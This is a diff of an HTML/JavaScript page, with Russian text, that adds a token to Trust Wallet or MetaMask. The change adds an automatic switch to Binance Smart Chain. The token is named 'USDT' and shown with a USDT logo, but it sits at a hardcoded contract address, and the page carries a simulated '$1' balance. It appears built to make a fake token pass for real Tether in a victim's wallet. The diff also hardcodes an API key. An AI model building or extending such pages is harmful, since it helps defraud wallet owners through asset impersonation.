@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Добавить токен в кошелек</title>
+    <title>Добавить токен BEP-20 в кошелек</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -70,9 +70,9 @@
     </style>
 </head>
 <body>
-    <h1>Добавить токен в кошелек</h1>
-    <p>Работает для Trust Wallet и MetaMask</p>
-    <button class="button" onclick="addTokenToWallet()">Добавить токен в кошелек</button>
+    <h1>Добавить токен BEP-20</h1>
+    <p>Для Trust Wallet и MetaMask (Binance Smart Chain)</p>
+    <button class="button" onclick="switchToBSCAndAddToken()">Добавить токен в кошелек</button>
 
     <div class="wallet-container">
         <button class="button" onclick="fetchTokenBalance()">Обновить баланс (имитация $1)</button>
@@ -82,51 +82,84 @@
 
     <script>
         const tokenData = {
-            address: "0x61121f6c9ee92845F4946Bc3f55212828F009387", // Ваш токен
+            address: "0x61121f6c9ee92845F4946Bc3f55212828F009387", // Ваш токен BEP-20
             symbol: "USDT",
             decimals: 18,
-            image: "https://i.ibb.co/svdDyVsP/image.png",
+            image: "https://i.ibb.co/svdDyVsP/image.png", // Логотип USDT
             price: 1 // Для имитации
         };
 
         const walletAddress = "0x373b557f75599e20569e7EC9Ae451914850F93fC";
         const apiKey = "A567ESIJMVGJAJM3ICSMR3VCETS1I915NF";
+        const bscChainId = "0x38"; // Chain ID для BSC Mainnet (56 в десятичной)
 
         let walletData = JSON.parse(localStorage.getItem('walletData')) || {
             tokenAmount: 0,
             totalBalance: 0
         };
 
-        // Добавление токена в кошелек
-        async function addTokenToWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const provider = window.ethereum;
-                    const wasAdded = await provider.request({
-                        method: 'wallet_watchAsset',
-                        params: {
-                            type: 'ERC20', // Работает для BEP-20
-                            options: {
-                                address: tokenData.address,
-                                symbol: tokenData.symbol,
-                                decimals: tokenData.decimals,
-                                image: tokenData.image
-                            }
-                        }
-                    });
-
-                    if (wasAdded) {
-                        alert('Токен добавлен в ваш кошелек!');
-                        localStorage.setItem('tokenAdded', JSON.stringify(tokenData));
-                    } else {
-                        alert('Вы отклонили добавление токена.');
-                    }
-                } catch (error) {
-                    console.error('Ошибка:', error);
-                    alert('Ошибка при добавлении токена.');
-                }
-            } else {
+        // Переключение на BSC и добавление токена
+        async function switchToBSCAndAddToken() {
+            if (typeof window.ethereum === 'undefined') {
                 alert('Откройте эту страницу в Trust Wallet (Browser) или MetaMask.');
+                return;
+            }
+
+            const provider = window.ethereum;
+
+            try {
+                // Проверяем текущую сеть и переключаем на BSC
+                const currentChainId = await provider.request({ method: 'eth_chainId' });
+                if (currentChainId !== bscChainId) {
+                    await provider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: bscChainId }],
+                    });
+                    alert('Сеть переключена на Binance Smart Chain.');
+                }
+
+                // Добавляем токен
+                const wasAdded = await provider.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20', // BEP-20 распознается как ERC-20 в API
+                        options: {
+                            address: tokenData.address,
+                            symbol: tokenData.symbol,
+                            decimals: tokenData.decimals,
+                            image: tokenData.image
+                        }
+                    }
+                });
+
+                if (wasAdded) {
+                    alert('Токен BEP-20 добавлен в ваш кошелек!');
+                    localStorage.setItem('tokenAdded', JSON.stringify(tokenData));
+                } else {
+                    alert('Вы отклонили добавление токена.');
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                if (error.code === 4902) {
+                    // Если BSC не добавлена в кошелек, добавляем сеть
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: bscChainId,
+                            chainName: 'Binance Smart Chain',
+                            nativeCurrency: {
+                                name: 'BNB',
+                                symbol: 'BNB',
+                                decimals: 18
+                            },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com']
+                        }]
+                    });
+                    alert('Сеть BSC добавлена. Попробуйте снова.');
+                } else {
+                    alert('Ошибка: ' + error.message);
+                }
             }
         }
 
